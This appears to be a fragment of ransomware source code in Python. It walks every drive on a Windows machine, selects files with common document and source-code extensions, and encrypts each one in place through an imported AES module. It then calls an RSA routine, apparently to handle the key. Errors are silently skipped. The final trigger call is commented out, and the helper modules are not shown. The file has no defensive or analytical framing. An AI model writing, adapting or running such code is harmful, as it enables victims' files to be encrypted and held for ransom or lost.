import base64
import sys,os
import aes_encryption as aes
import asymmetric as RSA
import win32api
def find_file(root_folder):
    for root,dirs,files in os.walk(root_folder):
        for f in files:
            try:
                ext = f.split(".")[1]
            except:
                continue
            if(ext == "docx" or ext == "txt" or ext == "pptx" or ext == "pdf" or ext == "json" or ext == "html" or ext == "css" or ext == "js" or ext == "c" or ext == "java" or ext=="py"):
                try:
                    path = str(os.path.join(root, f))
                    aes.aes_encrypt(path)
                except:
                    continue
def find_file_in_all_drives():
    for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
        find_file(drive)
    RSA.d_main()
#find_file_in_all_drives()
